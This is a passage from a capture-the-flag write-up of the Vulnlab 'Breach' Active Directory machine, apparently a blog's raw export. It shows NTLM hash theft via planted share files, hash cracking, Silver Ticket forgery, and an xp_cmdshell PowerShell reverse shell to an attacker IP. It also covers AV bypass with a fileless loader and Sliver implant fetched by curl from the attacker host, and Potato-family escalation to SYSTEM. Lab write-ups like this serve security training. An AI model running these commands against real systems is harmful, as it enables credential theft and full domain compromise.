commands via <code>xp_cmdshell</code> which is one of the valid ways to execute commands through MSSQL. We could enumerate the local machine with <code>xp_dirtree</code> and use MSSQL queries to query to database, however you would not find much to my knowledge.</p>\n<p>There’s an interesting exploit that I learned through my progression in AD pen-testing and it involves precisely what we have now - a service account to MSSQL as well as that account have an SPN set for MSSQL. We could perform what’s called a Silver Ticket attack, which is essentially impersonating the Administrator account to authenticate to MSSQL via a forged TGS. </p>\n<p>If all goes well, we should be able to pass the silver ticket through to MSSQL and authenticate in the context of the Administrator user. Although we will still be executing commands through <code>xp_cmdshell</code> or <code>xp_dirtree</code> as <code>svc_mssql</code>, the MSSQL client will assume that we are logged in as the Administrator.</p>\n<p>You can find the articles that I used for research into this <a href=\"https://blog.netwrix.com/2022/08/31/impersonating-service-accounts-with-silver-tickets/\">here</a> and <a href=\"https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket\">here</a>.</p>\n<p>So there are a few things that we’ll need to perform this, notably:</p>\n<ul>\n<li>The NTLM hash of the <code>svc_mssql</code> account.</li>\n<li>The domain SID of the <code>svc_mssql</code> account.</li>\n<li>The SPN of the service we are requesting to.</li>\n<li>The name of the user we want to impersonate.</li>\n</ul>\n<p>This information is all easily accessible to us, excluding the NTLM hash of the service account. We do however already know their plaintext password, so we could just convert the plaintext to an NTLM hash. You can do so online, though I used <a href=\"https://codebeautify.org/ntlm-hash-generator\">this one</a> particularly.</p>\n<p>The domain SID is also in Bloodhound within the <code>svc_mssql</code> user node, which is <code>S-1-5-21-2330692793-3312915120-706255856</code>.</p>\n<p>SPNs are essentially just the service and the machine DNS name put together, meaning the SPN we are requesting for is <code>mssql/breachdc.breach.vl</code>. As for the username, we’re trying to impersonate the <code>Administrator</code>.</p>\n<p>We can use <code>impacket-ticketer</code> with all the information above to request a ticket for the specified SPN. With all the info taken into account, you should receive a command similar to the below.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ impacket-ticketer -nthash 69596C7[...snip...]870E25A5C -domain-sid S-1-5-21-2330692793-3312915120-706255856 -dc-ip 10.10.105.115 -spn mssql/breachdc.breach.vl -domain breach.vl Administrator</span><br><span class=\"line\">......</span><br><span class=\"line\">[*] Saving ticket in Administrator.ccache</span><br></pre></td></tr></table></figure>\n\n<p>As you can see, the ticket was saved as <code>Administrator.ccache</code>. We’ll now set this as our Kerberos authentication global variable and attempt to authenticate to MSSQL as the Administrator user.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ export KRB5CCNAME=Administrator.ccache</span><br><span class=\"line\"></span><br><span class=\"line\">└─$ impacket-mssqlclient -k breachdc.breach.vl -target-ip 10.10.105.115</span><br><span class=\"line\">SQL (BREACH\\Administrator  dbo@master)&gt;</span><br></pre></td></tr></table></figure>\n\n<p>It looks like we were successfully logged within the context of Administrator, let’s see if we can enable command execution.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SQL (BREACH\\Administrator  dbo@master)&gt; enable_xp_cmdshell</span><br><span class=\"line\">[*] INFO(BREACHDC\\SQLEXPRESS): Line 185: Configuration option &#x27;show advanced options&#x27; changed from 0 to 1. Run the RECONFIGURE statement to install.</span><br><span class=\"line\">[*] INFO(BREACHDC\\SQLEXPRESS): Line 185: Configuration option &#x27;xp_cmdshell&#x27; changed from 0 to 1. Run the RECONFIGURE statement to install.</span><br><span class=\"line\">SQL (BREACH\\Administrator  dbo@master)&gt; xp_cmdshell whoami</span><br><span class=\"line\">output             </span><br><span class=\"line\">----------------   </span><br><span class=\"line\">breach\\svc_mssql   </span><br><span class=\"line\"></span><br><span class=\"line\">NULL</span><br></pre></td></tr></table></figure>\n\n<p>It seems as though we can! Now that we are able to do this, let’s see if we can execute any arbitrary commands to gain a reverse shell. I opted to use a base64’d powershell reverse shell that you can make via <a href=\"https://www.revshells.com/\">revshells.com</a>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SQL (BREACH\\Administrator  dbo@master)&gt; xp_cmdshell powershell -e (POWERSHELL BASE64 REV SHELL ENCODED)</span><br><span class=\"line\">output                                                                             </span><br><span class=\"line\">--------------------------------------------------------------------------------   </span><br><span class=\"line\">#&lt; CLIXML                                                                          </span><br><span class=\"line\"></span><br><span class=\"line\">&lt;Objs Version=&quot;1.1.0.1&quot; xmlns=&quot;http://schemas.microsoft.com/powershell/2004/04&quot;&gt;&lt;S S=&quot;Error&quot;&gt;At line:1 char:1_x000D__x000A_&lt;/S&gt;&lt;S S=&quot;Error&quot;&gt;+ $client = New-Object System.Net.Sockets.TCPClient(&quot;10.8.0.173&quot;,9001); ..._x000D__x000A_&lt;/S&gt;&lt;S S=&quot;Error&quot;&gt;+ ~~~~~~~   </span><br><span class=\"line\"></span><br><span class=\"line\">~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~_x000D__x000A_&lt;/S&gt;&lt;S S=&quot;Error&quot;&gt;This script contains malicious content and has been blocked by your antivirus software._x000D__x000A_&lt;/S&gt;&lt;S S=&quot;Error&quot;&gt;    + CategoryInfo          : ParserError: (   </span><br><span class=\"line\"></span><br><span class=\"line\">:) [], ParentContainsErrorRecordException_x000D__x000A_&lt;/S&gt;&lt;S S=&quot;Error&quot;&gt;    + FullyQualifiedErrorId : ScriptContainedMaliciousContent_x000D__x000A_&lt;/S&gt;&lt;S S=&quot;Error&quot;&gt; _x000D__x000A_&lt;/S&gt;&lt;/Objs&gt;</span><br></pre></td></tr></table></figure>\n\n<p>If you’ll notice from the above command output, it seems that AV is enabled on this machine - meaning we can’t simply execute malicious files as we normally would.</p>\n<h1 id=\"Bypassing-AV-with-PE-Loaders\"><a href=\"#Bypassing-AV-with-PE-Loaders\" class=\"headerlink\" title=\"Bypassing AV with PE Loaders\"></a>Bypassing AV with PE Loaders</h1><p>Since this is a Windows 2022 Datacenter (which I found later on for Priv Esc), we could simply just upload a Havoc binary since the signatures for <a href=\"https://github.com/HavocFramework/Havoc\">Havoc C2</a> beacons are not considered malicious in this version of Windows. If you stood up a havoc server, you should be able to upload the demon x64 binary through MSSQL and execute it to get a reverse shell.</p>\n<p>I wanted to use a different exploit this time around though that involves using Sliver. There’s a really interesting loader that I learned to use recently for AV bypass - one that even works for the most recent version of Windows 11. This specific loader is called <a href=\"https://github.com/SaadAhla/FilelessPELoader\">FilelessPELoader</a>, and it requires a bit of signature detection obfuscation before utilizing it properly. Luckily enough, the author of this loader (seamys, all credit goes to him for the development of this loader) has made a relatively short walkthrough on how to do this that you can find <a href=\"https://youtu.be/NmB2MPAafTo?si=58ITZ4LFxG2DBc2t\">here</a>.</p>\n<p>So if you’ve followed the loader walkthrough video accordingly, you should have the executable compiled from Visual Studio. I’ll spin up a quick <a href=\"https://github.com/BishopFox/sliver\">Sliver C2</a> server and create an implant as well as start an MTLS listener.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sliver &gt; mtls</span><br><span class=\"line\">[*] Starting mTLS listener ...</span><br><span class=\"line\">[*] Successfully started job #1</span><br><span class=\"line\">sliver &gt; generate --mtls (YOUR IP) --os windows --format exe --arch amd64 --save (DIRECTORY) --name breach</span><br></pre></td></tr></table></figure>\n\n<p>Skipping symbol obfuscation with <code>--skip-symbols</code> shouldn’t matter here, though if you do run into problems with the loader feel free to set that to a newly generated binary.</p>\n<p>Next be sure to load this with the <code>aes.py</code> file that is provided in the FilelessPELoader GitHub repo, we can do this easily by running it with <code>python3 aes.py breach.exe</code>. This should generated the respective key files needed for the exploit.</p>\n<p>Now that all of the legwork is done, you should have four files within your directory - <code>breach.exe</code>, <code>cipher.bin</code>, <code>key.bin</code>, and finally your obfuscated loader that you compiled previously. Make sure to host your directory that contains these four files with a simple Python HTTP server at the port of your choosing. We’ll now head back to MSSQL and execute the commands needed to exploit this.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SQL (BREACH\\Administrator  dbo@master)&gt; xp_cmdshell powershell &quot;cd C:\\; mkdir temp; cd C:\\temp; curl http://(YOUR IP):9001/dazzad.exe -O dazzad.exe; .\\dazzad.exe (YOUR IP) 9001 cipher.bin key.bin&quot;</span><br></pre></td></tr></table></figure>\n\n<p>The above one-liner should create a temp directory in <code>C:\\</code> and download the loader, before finally executing the key files remotely based on your HTTP server.</p>\n<p><img src=\"/images/vulnlab/breach-vl/d.png\"></p>\n<p>As you can see after a bit of waiting, a session has been created as <code>svc_mssql</code>.</p>\n<h1 id=\"Exploiting-SeImpersonatePrivilege-Against-SYSTEM\"><a href=\"#Exploiting-SeImpersonatePrivilege-Against-SYSTEM\" class=\"headerlink\" title=\"Exploiting SeImpersonatePrivilege Against SYSTEM\"></a>Exploiting SeImpersonatePrivilege Against SYSTEM</h1><p>Now that we have code execution as <code>svc_mssql</code> on the remote system, we can look around to see if their are any binaries or privileges that we can exploit.</p>\n<p>Luckily enough, this should not be very difficult as we already contain a privilege that we exploited previously to impersonate Administrator on the MSSQL service. We can use this same privilege to impersonate SYSTEM on the local machine.</p>\n<p>Before we do this though, I want to detail why this exploit specifically works with a service account that has SeImpersonatePrivilege. Service accounts, by default, will have this privilege along with SeAssignPrimaryTokenPrivilege. Having SeImpersonatePrivilege essentially allows our service account to impersonate a user or specified user to perform actions on behalf of that user.</p>\n<p><img src=\"/images/vulnlab/breach-vl/e.png\"></p>\n<p>Exploiting this is relatively simple, as we can impersonate SYSTEM and authenticate to an evil named pipe that we create. We can direct this named pipe to a binary to execute, which will run in the context of SYSTEM.</p>\n<p>In the past and up until now, the easiest way was to utilize the Potato Family of exploits to impersonate and spawn this named pipe. As of today, most of the Potato family has been detected by Defender which renders most of the executables unusable with traditional means.</p>\n<p>Luckily enough since we currently have a session through an obfuscated payload that isn’t detected by Defender, we can execute these binaries through a .NET assembly that shouldn’t allow them to be detected from Defender’s behavioral detection. I tested this out with two different exploits in the Potato family, notably <a href=\"https://github.com/CCob/SweetPotato\">SweetPotato</a> and <a href=\"https://github.com/bugch3ck/SharpEfsPotato\">SharpEfsPotato</a>.</p>\n<p>You’ll need to compile both of these executables in Visual Studio on a Windows host before using it with Sliver.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ ls | grep Potato</span><br><span class=\"line\">SharpEfsPotato.exe</span><br><span class=\"line\">SweetPotato.exe</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have either one of these executables, we can use Sliver’s built-in <code>execute-assembly</code> command to execute these binaries through a .NET assembly. This prevents us from needing to drop the binaries locally on the compromised machine.</p>\n<p>I’ve provided the arguments that you’ll need in order to execute either one of these exploits. Both will land you a new session as SYSTEM if exploited correctly. Remember to ensure that you still have your simple Python HTTP server running since the arguments passed into either exploit will be executing our loader from before.</p>\n<p>The first that I’ll show is using SharpEfsPotato to exploit this.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sliver (breach) &gt; execute-assembly SharpEfsPotato.exe &#x27;-p C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -a &quot;C:\\temp\\dazzad.exe (KALI IP) 9001 cipher.bin key.bin&quot;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Output:</span><br><span class=\"line\">SharpEfsPotato by @bugch3ck</span><br><span class=\"line\">  Local privilege escalation from SeImpersonatePrivilege using EfsRpc.</span><br><span class=\"line\"></span><br><span class=\"line\">  Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.</span><br><span class=\"line\"></span><br><span class=\"line\">[+] Triggering name pipe access on evil PIPE \\\\localhost/pipe/e5b2e9a2-d802-4d36-aeab-2e0e4482647b/\\e5b2e9a2-d802-4d36-aeab-2e0e4482647b\\e5b2e9a2-d802-4d36-aeab-2e0e4482647b</span><br><span class=\"line\">df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:</span><br><span class=\"line\">[x]RpcBindingSetAuthInfo failed with status 0x6d3</span><br><span class=\"line\">[+] Server connected to our evil RPC pipe</span><br><span class=\"line\">[+] Duplicated impersonation token ready for process creation</span><br><span class=\"line\">[+] Intercepted and authenticated successfully, launching program</span><br><span class=\"line\">[+] Process created, enjoy!</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Session b4eedc0a breach - 10.10.112.238:63780 (BREACHDC) - windows/amd64 - Sat, 29 Jun 2024 00:20:05 EDT</span><br></pre></td></tr></table></figure>\n\n<p>And the next that I’ll show is using SweetPotato to exploit the same functionality.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sliver (breach) &gt; execute-assembly SweetPotato.exe &#x27;-p C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -a &quot;C:\\temp\\dazzad.exe (KALI IP) 9001 cipher.bin key.bin&quot; -e EfsRpc&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Output:</span><br><span class=\"line\">SweetPotato by @_EthicalChaos_</span><br><span class=\"line\">  Orignal RottenPotato code and exploit by @foxglovesec</span><br><span class=\"line\">  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery</span><br><span class=\"line\">  PrintSpoofer discovery and original exploit by @itm4n</span><br><span class=\"line\">  EfsRpc built on EfsPotato by @zcgonvh and PetitPotam by @topotam</span><br><span class=\"line\">[+] Attempting NP impersonation using method EfsRpc to launch C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</span><br><span class=\"line\">[+] Triggering name pipe access on evil PIPE \\\\localhost/pipe/ad72050e-613c-4ae3-a1c0-1c8f6908f715/\\ad72050e-613c-4ae3-a1c0-1c8f6908f715\\ad72050e-613c-4ae3-a1c0-1c8f6908f715</span><br><span class=\"line\">[+] Server connected to our evil RPC pipe</span><br><span class=\"line\">[+] Duplicated impersonation token ready for process creation</span><br><span class=\"line\">[+] Intercepted and authenticated successfully, launching program</span><br><span class=\"line\">[+] Process created, enjoy!</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Session 4123ca51 breach - 10.10.112.238:63856 (BREACHDC) - windows/amd64 - Sat, 29 Jun 2024 00:24:18 EDT</span><br></pre></td></tr></table></figure>\n\n<p>Note that I needed to specify the exploit mode to <code>EfsRpc</code> as the other exploit modes should fail due to an unsuccessful authentication interceptions. I’ve found this to really only work consistently with <code>EfsRpc</code>.</p>\n<p><img src=\"/images/vulnlab/breach-vl/f.png\"></p>\n<p>As seen from the above, both have spawned a session as SYSTEM. This means that we can simply use either session and access the root flag within the Administrator’s Desktop directory.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sliver (breach) &gt; use 4123ca51-3f10-4ee7-a5e5-7142245ad26a</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Active session breach (4123ca51-3f10-4ee7-a5e5-7142245ad26a)</span><br><span class=\"line\"></span><br><span class=\"line\">sliver (breach) &gt; cat &quot;C:\\Users\\Administrator\\Desktop\\root.txt&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">VL[...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have read the root flag, we have successfully compromised this machine!</p>\n<h1 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h1><p>I came back to this machine after not initially knowing what I was doing the first time around. I had completed it, but I didn’t really learn much from it. After about a few months of practicing red-teaming, I was more confident in what I was doing and put a lot of the resources that I had learned to the test. It seems that it paid off, which I’m satisfied with.</p>\n<p>Big thanks to xct for creating this machine, this machine was very fulfilling.</p>\n<h1 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h1><p><a href=\"https://wiki.vulnlab.com/guidance/medium/breach\">https://wiki.vulnlab.com/guidance/medium/breach</a><br><a href=\"https://github.com/Greenwolf/ntlm_theft\">https://github.com/Greenwolf/ntlm_theft</a><br><a href=\"https://www.kali.org/tools/responder/\">https://www.kali.org/tools/responder/</a><br><a href=\"https://hashcat.net/wiki/doku.php?id=example_hashes\">https://hashcat.net/wiki/doku.php?id=example_hashes</a><br><a href=\"https://github.com/dirkjanm/BloodHound.py\">https://github.com/dirkjanm/BloodHound.py</a><br><a href=\"https://www.kali.org/tools/bloodhound/\">https://www.kali.org/tools/bloodhound/</a><br><a href=\"https://blog.netwrix.com/2022/08/31/impersonating-service-accounts-with-silver-tickets/\">https://blog.netwrix.com/2022/08/31/impersonating-service-accounts-with-silver-tickets/</a><br><a href=\"https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket\">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket</a><br><a href=\"https://codebeautify.org/ntlm-hash-generator\">https://codebeautify.org/ntlm-hash-generator</a><br><a href=\"https://www.revshells.com/\">https://www.revshells.com/</a><br><a href=\"https://github.com/HavocFramework/Havoc\">https://github.com/HavocFramework/Havoc</a><br><a href=\"https://github.com/SaadAhla/FilelessPELoader\">https://github.com/SaadAhla/FilelessPELoader</a><br><a href=\"https://www.youtube.com/watch?si=58ITZ4LFxG2DBc2t&v=NmB2MPAafTo&feature=youtu.be\">https://www.youtube.com/watch?si=58ITZ4LFxG2DBc2t&amp;v=NmB2MPAafTo&amp;feature=youtu.be</a><br><a href=\"https://github.com/BishopFox/sliver\">https://github.com/BishopFox/sliver</a><br><a href=\"https://github.com/CCob/SweetPotato\">https://github.com/CCob/SweetPotato</a><br><a href=\"https://github.com/bugch3ck/SharpEfsPotato\">https://github.com/bugch3ck/SharpEfsPotato</a></p>\n","cover_type":"img","excerpt":"","more":"<p>Breach in particular was one of the first Vulnlab machines I had tried when I started Vulnlab back in December - though I really didn’t know what was going on as I had just started off doing red team labs. Since then, I’ve done essentially every easy machine on the Vulnlab archive and large amount of seasonal machines on HTB. Hopefully I’ll be able to relay this a bit easier this time around.</p>\n<h1 id=\"Enumeration\"><a href=\"#Enumeration\" class=\"headerlink\" title=\"Enumeration\"></a>Enumeration</h1><p>Let’s start out with our usual NMAP scans, just the default.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-10 17:08 EDT</span><br><span class=\"line\">Nmap scan report for 10.10.101.89</span><br><span class=\"line\">Host is up (0.13s latency).</span><br><span class=\"line\">Not shown: 986 filtered tcp ports (no-response)</span><br><span class=\"line\">PORT     STATE SERVICE</span><br><span class=\"line\">53/tcp   open  domain</span><br><span class=\"line\">80/tcp   open  http</span><br><span class=\"line\">88/tcp   open  kerberos-sec</span><br><span class=\"line\">135/tcp  open  msrpc</span><br><span class=\"line\">139/tcp  open  netbios-ssn</span><br><span class=\"line\">389/tcp  open  ldap</span><br><span class=\"line\">445/tcp  open  microsoft-ds</span><br><span class=\"line\">464/tcp  open  kpasswd5</span><br><span class=\"line\">593/tcp  open  http-rpc-epmap</span><br><span class=\"line\">636/tcp  open  ldapssl</span><br><span class=\"line\">1433/tcp open  ms-sql-s</span><br><span class=\"line\">3268/tcp open  globalcatLDAP</span><br><span class=\"line\">3269/tcp open  globalcatLDAPssl</span><br><span class=\"line\">3389/tcp open  ms-wbt-server</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 21.40 seconds</span><br></pre></td></tr></table></figure>\n\n<p>We have a few ports to take a look at here, notably the HTTP server, LDAP, and SMB. Another big thing to mention is that MSSQL seems to be externally facing - which is a vulnerability in of itself. This database and this service should be internal.</p>\n<p><img src=\"/images/vulnlab/breach-vl/b.png\"></p>\n<p>The HTTP server seems to be a default IIS page, with nothing much else on it. It doesn’t seem to be associated with a domain, meaning there’s a high chance that we don’t need to enumerate for any subdomains.</p>\n<p>Gobuster didn’t seem to return any results either in terms of directory brute-forcing. I couldn’t find much aside from this in terms of the IIS server, so we’ll move to another service.</p>\n<p>In terms of the domain itself, I found the DNS names for the target machine denoted as <code>BREACHDC.breach.vl</code> as seen in the RDP results.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">3389/tcp open  ms-wbt-server Microsoft Terminal Services</span><br><span class=\"line\">|_ssl-date: 2024-06-10T21:17:12+00:00; +4s from scanner time.</span><br><span class=\"line\">| rdp-ntlm-info: </span><br><span class=\"line\">|   Target_Name: BREACH</span><br><span class=\"line\">|   NetBIOS_Domain_Name: BREACH</span><br><span class=\"line\">|   NetBIOS_Computer_Name: BREACHDC</span><br><span class=\"line\">|   DNS_Domain_Name: breach.vl</span><br><span class=\"line\">|   DNS_Computer_Name: BREACHDC.breach.vl</span><br><span class=\"line\">|   DNS_Tree_Name: breach.vl</span><br><span class=\"line\">|   Product_Version: 10.0.20348</span><br><span class=\"line\">|_  System_Time: 2024-06-10T21:16:33+00:00</span><br><span class=\"line\">| ssl-cert: Subject: commonName=BREACHDC.breach.vl</span><br></pre></td></tr></table></figure>\n\n<p>We can fill these in within our <code>/etc/hosts</code> file to make sure that the IP address is resolved to both of these domain names.</p>\n<p>In terms of SMB, it seems that we have access to enumerate multiple shares as seen below.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ smbclient -L 10.10.101.89 -N               </span><br><span class=\"line\"></span><br><span class=\"line\">        Sharename       Type      Comment</span><br><span class=\"line\">        ---------       ----      -------</span><br><span class=\"line\">        ADMIN$          Disk      Remote Admin</span><br><span class=\"line\">        C$              Disk      Default share</span><br><span class=\"line\">        IPC$            IPC       Remote IPC</span><br><span class=\"line\">        NETLOGON        Disk      Logon server share </span><br><span class=\"line\">        share           Disk      </span><br><span class=\"line\">        SYSVOL          Disk      Logon server share </span><br><span class=\"line\">        Users           Disk      </span><br><span class=\"line\">Reconnecting with SMB1 for workgroup listing.</span><br><span class=\"line\">do_connect: Connection to 10.10.101.89 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)</span><br><span class=\"line\">Unable to connect with SMB1 -- no workgroup available</span><br></pre></td></tr></table></figure>\n\n<p>These specific shares are <code>share</code> and <code>Users</code>, which we can enumerate for the possibility of any obscene abnormalities. The <code>Users</code> share did not seem to have anything within it aside from the default user folder, so I moved on to see if there was anything within <code>share</code>.</p>\n<p>There are three folders within this specific SMB share, being <code>finance</code>, <code>software</code>, and <code>transfer</code>. While we don’t have access to two of them, it seems that there are a few users within <code>transfer</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">smb: \\transfer\\&gt; ls</span><br><span class=\"line\">  .                                   D        0  Thu Feb 17 09:00:35 2022</span><br><span class=\"line\">  ..                                  D        0  Thu Feb 17 09:11:08 2022</span><br><span class=\"line\">  claire.pope                         D        0  Thu Feb 17 06:21:35 2022</span><br><span class=\"line\">  diana.pope                          D        0  Thu Feb 17 06:21:19 2022</span><br><span class=\"line\">  julia.wong                          D        0  Thu Feb 17 06:24:39 2022</span><br><span class=\"line\"></span><br><span class=\"line\">7863807 blocks of size 4096. 2618937 blocks available</span><br></pre></td></tr></table></figure>\n\n<p>We don’t have access to any of these users, though we do know now that these are potentially users that we’ll need to compromise.</p>\n<p>I ran a few tests through Kerberos with these users, however it doesn’t seem like they have <code>no-preauth</code> set or any of them are kerberoastable. There wasn’t much outside of this, as the other directories in this share didn’t seem to have much.</p>\n<p>Given what we know (or lack thereof) at this point, I tried to get a nudge from the <a href=\"https://wiki.vulnlab.com/guidance/medium/breach\">Wiki</a> to see if there were any leads. It seems that the site says <code>- Assume that someone is visiting the share regulary.</code>, which points us back at SMB.</p>\n<h1 id=\"NTLM-Theft-for-Credential-Stealing\"><a href=\"#NTLM-Theft-for-Credential-Stealing\" class=\"headerlink\" title=\"NTLM Theft for Credential Stealing\"></a>NTLM Theft for Credential Stealing</h1><p>If you’ll notice, it seems that we have write access to the share.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">smb: \\&gt; ls</span><br><span class=\"line\">  .                                   D        0  Thu Feb 17 09:11:08 2022</span><br><span class=\"line\">  ..                                DHS        0  Thu Feb 17 10:38:00 2022</span><br><span class=\"line\">  finance                             D        0  Thu Feb 17 06:19:34 2022</span><br><span class=\"line\">  software                            D        0  Thu Feb 17 06:19:12 2022</span><br><span class=\"line\">  transfer                            D        0  Tue Jun 11 00:58:38 2024</span><br><span class=\"line\"></span><br><span class=\"line\">7863807 blocks of size 4096. 2597887 blocks available</span><br><span class=\"line\">smb: \\&gt; put ul.txt</span><br><span class=\"line\">putting file ul.txt as \\ul.txt (0.2 kb/s) (average 0.2 kb/s)</span><br></pre></td></tr></table></figure>\n\n<p>Given that we have write access and we know that there are individuals that are visiting the share, our foothold seems to be phishing (or at least emulating phishing). We’ll more than likely need to place either a reverse shell or some kind of hash theft file within this share. Just a small assumption I made based on the difficulty of the machine - us uploading a reverse shell probably isn’t what we’re supposed to do here.</p>\n<p>So our next tactic we’ll utilize will have to be aimed more at credential theft. This is where I learned about a new tactic that we could try - <a href=\"https://github.com/Greenwolf/ntlm_theft\">NTLM Theft</a>.</p>\n<p>We can use the above tool to generate files that are used for stealing NTLM hashes. If a user is accessing and opening these files, we can point these same files back to a server we stand up to steal said credentials. We can use tools like <a href=\"https://www.kali.org/tools/responder/\">Responder</a> or Impacket’s SMB server to steal these credentials, I’ll use responder for this though you could use the ladder.</p>\n<p>After downloading the tool from the repository, we can use it with the below command.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ python3 ntlm_theft.py -s (KALI IP) -f daz -g all</span><br><span class=\"line\">Created: daz/daz.scf (BROWSE TO FOLDER)</span><br><span class=\"line\">Created: daz/daz-(url).url (BROWSE TO FOLDER)</span><br><span class=\"line\">Created: daz/daz-(icon).url (BROWSE TO FOLDER)</span><br><span class=\"line\">......</span><br><span class=\"line\">Generation Complete.</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have all of these files, we’ll need to start up Responder and then place of these files within the share. You can start up responder with <code>sudo responder -I (VPN INTERFACE NAME).</code></p>\n<p>I also created a short one-liner that will upload these files to the share, as seen below.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ for file in $(ls .); do smbclient -c &quot;cd transfer; put $file&quot; \\\\\\\\10.10.100.72\\\\share -N; done</span><br></pre></td></tr></table></figure>\n\n<p>This should upload all of the files to the directory, I adjusted us to upload them within the <code>transfer</code> directory as I found immediate luck within that specific folder in the share.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[SMB] NTLMv2-SSP Client   : 10.10.100.72</span><br><span class=\"line\">[SMB] NTLMv2-SSP Username : BREACH\\Julia.Wong</span><br><span class=\"line\">[SMB] NTLMv2-SSP Hash     : Julia.Wong::BREACH:7a6c9594b3106927:59112474C75D713D82011FAC045A066C:010100000000000000F9EE819EBBDA015CDC76BFA3AFC7C3[...snip...]000009001E0063006900660073002F00310030002E0038002E0030002E003100370033000000000000000000</span><br></pre></td></tr></table></figure>\n\n<p>As you can see, we received the NTLMv2 hash for the user <code>julia.wong</code>. Now that we have their hash, we can try to crack it using hashcat.</p>\n<p>The hash identifier for NetNTLMv2 hashes is 5600. You can find this within the hashcat <a href=\"https://hashcat.net/wiki/doku.php?id=example_hashes\">example hashes</a> page.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ hashcat -a 0 -m 5600 julia_wong.txt /usr/share/wordlists/rockyou.txt</span><br><span class=\"line\"></span><br><span class=\"line\">0f27aeed2fce6717ed091b98a2417efc8960a080416ea342bfd343d4b9ae2f6830a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e0038002e0030002e003100370033000000000000000000:[...snip...]</span><br><span class=\"line\"></span><br><span class=\"line\">Session..........: hashcat</span><br><span class=\"line\">Status...........: Cracked</span><br><span class=\"line\">Hash.Mode........: 5600 (NetNTLMv2)</span><br></pre></td></tr></table></figure>\n\n<p>This should give you the plaintext password for <code>julia.wong</code>, meaning we can now utilize their credentials to perform a variety of different actions within this machine. If you log back in to SMB using these credentials, you’ll find the first flag for the machine located within <code>julia.wong</code>‘s directory.</p>\n<h1 id=\"Dumping-LDAP\"><a href=\"#Dumping-LDAP\" class=\"headerlink\" title=\"Dumping LDAP\"></a>Dumping LDAP</h1><p>I verified with crackmapexec, it seems that we do not have WinRM access meaning we’ll need to pivot to another service&#x2F;user. We can first attempt to enumerate LDAP, as we’ll be able to see if there are any other users we can pivot to.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec ldap 10.10.100.72 -u &#x27;julia.wong&#x27; -p &#x27;(JULIA.WONG PASSWORD)&#x27;</span><br><span class=\"line\">SMB         10.10.100.72    445    BREACHDC         [*] Windows Server 2022 Build 20348 x64 (name:BREACHDC) (domain:breach.vl) (signing:True) (SMBv1:False)</span><br><span class=\"line\">LDAP        10.10.100.72    389    BREACHDC         [+] breach.vl\\julia.wong:[...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>Let’s utilize the <a href=\"https://github.com/dirkjanm/BloodHound.py\">Python ingestor</a> for <a href=\"https://www.kali.org/tools/bloodhound/\">Bloodhound</a> to dump the domain, as we can try to enumerate what our current user can do along with getting a user list of all the user objects within the domain.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ bloodhound-python -d &#x27;breach.vl&#x27; -u &#x27;julia.wong&#x27; -p &#x27;Computer1&#x27; -c all -ns 10.10.124.111 --zip</span><br></pre></td></tr></table></figure>\n\n<p>Our 